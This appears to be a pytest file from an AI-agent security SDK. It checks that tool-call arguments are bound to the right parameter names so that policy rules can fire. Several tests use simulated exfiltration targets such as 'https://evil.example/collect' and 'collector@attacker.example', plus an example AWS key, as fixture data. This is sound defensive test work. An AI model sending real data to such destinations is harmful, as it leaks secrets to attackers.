# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Norviq Contributors

"""What the engine is told a positionally-invoked tool was called with.

Every per-argument control Norviq offers addresses a parameter BY NAME — `param_paths.to`, a builder
constraint on `query`, a `destinations.emails` fact derived from the value under a recipient key. So
the payload `_tool_params` builds decides whether any of them can fire at all, and there are two ways
to get it wrong that are NOT the same:

* a MISSING name is fail-closed under the deny-by-default policy the intent compiler emits — the rule
  simply never matches, and not matching means deny;
* a WRONG name is fail-open — the operator's pin inspects a compliant value while the tool receives
  the attacker's, and the near-miss explainer is lied to as well.

These tests pin both sides: the trampoline shape must recover its names (it was degrading to the
unnamed form for the framework's most common tool), and every shape where the names cannot be trusted
must keep degrading to the unnamed form rather than guessing.
"""

from __future__ import annotations

import asyncio
import functools
import json
from typing import Any

import pytest

from norviq.sdk.core.wrapping import _tool_params, callable_signature

try:
    from langchain_core.tools import BaseTool, StructuredTool, tool as lc_tool
except ImportError:  # pragma: no cover
    pytest.skip("langchain-core required", allow_module_level=True)


class _RecordingInterceptor:
    """Captures the params the engine WOULD have evaluated."""

    def __init__(self) -> None:
        self.params: dict[str, Any] = {}

    async def intercept_or_raise(self, *, tool_name: str, tool_params: dict, session_id: str,
                                 framework: str) -> None:
        self.params = tool_params


def _bind(func: Any, *args: Any, **kwargs: Any) -> dict:
    """What the engine is told, for a call made exactly this way."""
    return _tool_params(args, kwargs, callable_signature(func))


# ── the framework trampoline recovers its names ───────────────────────────────────────────────────
#
# `@tool` — the decorator LangChain's own docs lead with — produces a `StructuredTool` whose `_run` is
# `(self, *args, config, run_manager=None, **kwargs)` and which forwards those arguments verbatim to
# `self.func`. `BaseTool._to_args_and_kwargs` returns `(tool_input,), {}` for a string input, so this
# is the ORDINARY path, not an edge case: `fetch_url.run("https://evil.example/collect")` reached the
# engine as `{"args": [...]}` and `param_paths.url` could not fire. A hand-written `BaseTool` with
# `def _run(self, query)` bound correctly, so the fix worked for everything except the common case.

@lc_tool
def fetch_url(url: str, timeout: int = 5) -> str:
    """fetch a url"""
    return "ok"


@lc_tool
async def push_data(dest: str) -> str:
    """push data somewhere"""
    return "ok"


def test_the_decorator_produced_tool_binds_its_argument_by_name() -> None:
    assert _bind(fetch_url._run, "https://evil.example/collect") == {"url": "https://evil.example/collect"}


def test_the_framework_plumbing_kwargs_do_not_break_the_bind() -> None:
    """LangChain injects `config`/`run_manager` into `_run`; the tool body never declares them.

    The exact bind fails on plumbing the tool never asked for, so the retry drops it. Dropping a
    keyword cannot renumber a positional — the positional-to-parameter mapping is fixed by the
    signature's own order — so this is the same bind minus plumbing, not a second guess.
    """
    got = _bind(fetch_url._run, "https://evil.example/collect", config={"tags": []}, run_manager=object())
    assert got == {"url": "https://evil.example/collect"}
    assert "config" not in got and "run_manager" not in got


def test_the_async_trampoline_reads_the_coroutine_not_the_sync_func() -> None:
    assert _bind(push_data._arun, "https://evil.example/collect") == {"dest": "https://evil.example/collect"}


def test_the_crewai_trampoline_binds_by_name_too() -> None:
    """CrewAI's `@tool` has the same shape — `Tool._run(*args, **kwargs)` forwarding to `self.func`."""
    crewai_tool = pytest.importorskip("crewai.tools").tool

    @crewai_tool("crew_fetch")
    def crew_fetch(url: str) -> str:
        """fetch a url"""
        return "ok"

    assert _bind(crew_fetch._run, "https://evil.example/collect") == {"url": "https://evil.example/collect"}


def test_a_second_positional_still_lands_on_its_own_name() -> None:
    assert _bind(fetch_url._run, "https://api.acme.com", 30) == {"url": "https://api.acme.com", "timeout": 30}


def test_the_end_to_end_langchain_path_names_the_argument() -> None:
    """Through the real adapter and the real `.run()` entrypoint, not just the helper."""
    from norviq.sdk.langchain.adapter import protect

    rec = _RecordingInterceptor()

    @lc_tool
    def send_report(to: str) -> str:
        """send a report"""
        return f"sent:{to}"

    protect([send_report], rec, session_id="s")
    send_report.run("collector@attacker.example")
    assert rec.params == {"to": "collector@attacker.example"}, (
        "the recipient must be addressable, or `param_paths.to` is a rule about no call at all"
    )


# ── and never invents one ─────────────────────────────────────────────────────────────────────────

def _tenant_decorator(tenant: str):
    def deco(fn):
        @functools.wraps(fn)
        def inner(self, *a, **k):
            return fn(self, tenant, *a, **k)
        return inner
    return deco


class _ShiftedTool(BaseTool):
    """A decorator injects a leading argument the caller never passes."""

    name: str = "send_email"
    description: str = "sends mail"

    @_tenant_decorator("acme")
    def _run(self, tenant: str = "", to: str = "", body: str = "") -> str:
        return f"sent:{to}"


def test_a_shifted_signature_is_still_refused_rather_than_guessed() -> None:
    """The trampoline fallthrough must not become a way back into index-shifted names.

    `functools.wraps` makes `inspect.signature` report the signature UNDERNEATH the decorator while
    the caller uses the decorated convention, so `('tenant', 'to', 'body')` would file the attacker's
    address under `tenant` and a compliant one under the `to` the operator pinned.
    """
    got = _bind(_ShiftedTool()._run, "collector@attacker.example", "ops@acme.com")
    assert got.get("to") != "ops@acme.com", "a shifted signature produced a WRONG name binding"
    assert got == {"args": ["collector@attacker.example", "ops@acme.com"]}


def test_a_wrapped_implementation_under_func_is_not_followed_either() -> None:
    """Same skew, one level down: the trampoline is honest and its `func` is the wrapper.

    `follow_wrapped=False` means the implementation reports its own `(*a, **k)`, which names nothing —
    so we stay with the unnamed form instead of reaching through to the undecorated signature.
    """
    def real(tenant: str, to: str) -> str:
        return f"sent:{to}"

    @functools.wraps(real)
    def shifted(*a: Any, **k: Any) -> str:
        return real("acme", *a, **k)

    st = StructuredTool.from_function(func=shifted, name="send_email", description="d")
    got = _bind(st._run, "collector@attacker.example")
    assert got == {"args": ["collector@attacker.example"]}


class _ImpostorTool(BaseTool):
    """A `(*args, **kwargs)` `_run` and an unrelated attribute that merely happens to be called `func`."""

    name: str = "impostor"
    description: str = "d"

    def _run(self, *args: Any, **kwargs: Any) -> str:
        return "ok"

    @property
    def func(self) -> Any:
        def something_else(tenant: str, to: str) -> str:  # names this tool never binds
            return "x"
        return something_else


def test_names_are_only_taken_from_an_implementation_the_framework_declared() -> None:
    """`args_schema` is the framework's own statement of this tool's arguments, and it must corroborate.

    Without that second source, any `(*args)` tool carrying an attribute called `func` would hand the
    binder a name list belonging to some other callable — which is the WRONG-name failure again.
    """
    got = _bind(_ImpostorTool()._run, "collector@attacker.example", "ops@acme.com")
    assert "tenant" not in got and "to" not in got
    assert got == {"args": ["collector@attacker.example", "ops@acme.com"]}


# ── the shapes that already worked, pinned ────────────────────────────────────────────────────────

class _PositionalTool(BaseTool):
    name: str = "send_email"
    description: str = "sends mail"

    def _run(self, to: str = "", body: str = "") -> str:
        return f"sent:{to}"


def test_a_hand_written_tool_is_unaffected() -> None:
    assert _bind(_PositionalTool()._run, "ops@acme.com", "figures") == {"to": "ops@acme.com", "body": "figures"}


class _ControlNameTool(BaseTool):
    """A real parameter that collides with a framework control kwarg, in the MIDDLE of the list."""

    name: str = "send_email"
    description: str = "sends mail"

    def _run(self, to: str = "", tags: str = "", body: str = "") -> str:
        return f"sent:{to}"


def test_a_control_named_parameter_the_tool_declared_is_an_argument_not_plumbing() -> None:
    """A parameter the TOOL DECLARES is data, whatever it is named — and `body` must not slide over.

    Two things at once, because the second used to hide the first.

    Renumbering: under an index-zip, removing `tags` shifted every following name by one, so the
    credential arrived under `body` while the name after it took the value the operator pinned.
    `Signature.bind` maps names before anything is filtered, so a filter can only ever REMOVE a name,
    never move one — pinned here.

    Deletion: `tags`/`metadata`/`config` are ordinary API words, and stripping them by NAME deleted
    real arguments from the payload. Measured on both shipped baselines, an AWS key in a `tags: str`
    parameter went from ("block", "llm02_data_leakage") to ("allow", "default_allow") — recovering the
    argument names is what made it reachable, because while the payload was the unnamed
    `{"args": [...]}` the value was still in it for the data-class detector to find. The strip now
    applies only to values arriving through a `**kwargs` the tool never declared.
    """
    got = _bind(_ControlNameTool()._run, "ops@acme.com", "collector@attacker.example",
                "AKIAIOSFODNN7EXAMPLE")
    assert got == {
        "to": "ops@acme.com",
        "tags": "collector@attacker.example",
        "body": "AKIAIOSFODNN7EXAMPLE",
    }


def test_injected_plumbing_is_still_kept_out_of_the_payload() -> None:
    """The other half: what the FRAMEWORK injects must still never reach the engine.

    A `CallbackManagerForToolRun` carries nothing authorization-relevant and does not serialize, and a
    payload that fails to serialize makes the client fail closed — blocking healthy traffic for a
    non-policy reason. Both the undeclared route (`**kwargs`) and the declared-but-injected route
    (LangChain fills `run_manager`/`config` by parameter name) stay out.
    """
    class _Manager:  # stands in for CallbackManagerForToolRun
        pass

    class _CanonicalTool(BaseTool):
        name: str = "search"
        description: str = "searches"

        def _run(self, query: str = "", run_manager: Any = None) -> str:
            return "ok"

    tool = _CanonicalTool()
    assert _bind(tool._run, "find me") == {"query": "find me"}
    assert _bind(tool._run, "find me", run_manager=_Manager()) == {"query": "find me"}
    # ...and an undeclared one, arriving through the trampoline's **kwargs, is dropped as before.
    assert _bind(fetch_url._run, "https://acme.com", config={"tags": []}) == {"url": "https://acme.com"}


def test_an_unrepresentable_argument_is_not_spelled_the_same_as_an_absent_one() -> None:
    """Fail closed: a declared argument we cannot represent must still be SAYABLE.

    Dropping it would tell the engine the call has no such argument, so a rule pinning that parameter
    would inspect nothing and be satisfied. The sentinel matches no compliant pattern, so it denies.
    """
    class _Opaque:
        pass

    def _send(to: str = "", tags: Any = None) -> None:
        ...

    got = _tool_params(("ops@acme.com",), {"tags": _Opaque()}, callable_signature(_send))
    assert got["tags"] != "" and got["tags"] is not None
    assert "tags" in got, "an argument that could not be represented was silently deleted"
    assert got == {"to": "ops@acme.com", "tags": "<nrvq:unrepresentable>"}


def test_the_representability_check_is_bounded() -> None:
    """It runs per call on attacker-controlled input, and the engine fails closed at a 2s timeout.

    An unbounded walk here would itself be the denial of service, so both bounds answer "not
    representable" — the fail-closed answer — rather than running to completion.
    """
    from norviq.sdk.core.wrapping import _is_representable

    assert _is_representable({"a": ["b", 1, None, True]}) is True
    assert _is_representable(json.loads("[" * 40 + "]" * 40)) is False   # depth bound
    assert _is_representable(list(range(5000))) is False                 # node bound


def test_varargs_beyond_the_named_parameters_keep_the_args_list() -> None:
    class _VarargsTool(BaseTool):
        name: str = "varargs_tool"
        description: str = "takes anything"

        def _run(self, first: str = "", *rest: Any) -> str:
            return "ok"

    assert _bind(_VarargsTool()._run, "a", "b", "c") == {"first": "a", "args": ["b", "c"]}


def test_an_unreadable_signature_still_yields_no_names() -> None:
    """A callable whose signature cannot be read must not be guessed at either."""
    assert callable_signature(object()) is None          # not callable at all
    assert _tool_params(("x",), {}, None) == {"args": ["x"]}


def test_async_adapter_path_names_the_argument() -> None:
    from norviq.sdk.langchain.adapter import protect

    rec = _RecordingInterceptor()

    @lc_tool
    async def push_report(dest: str) -> str:
        """push a report"""
        return f"sent:{dest}"

    protect([push_report], rec, session_id="s")
    asyncio.run(push_report.arun("collector@attacker.example"))
    assert rec.params == {"dest": "collector@attacker.example"}
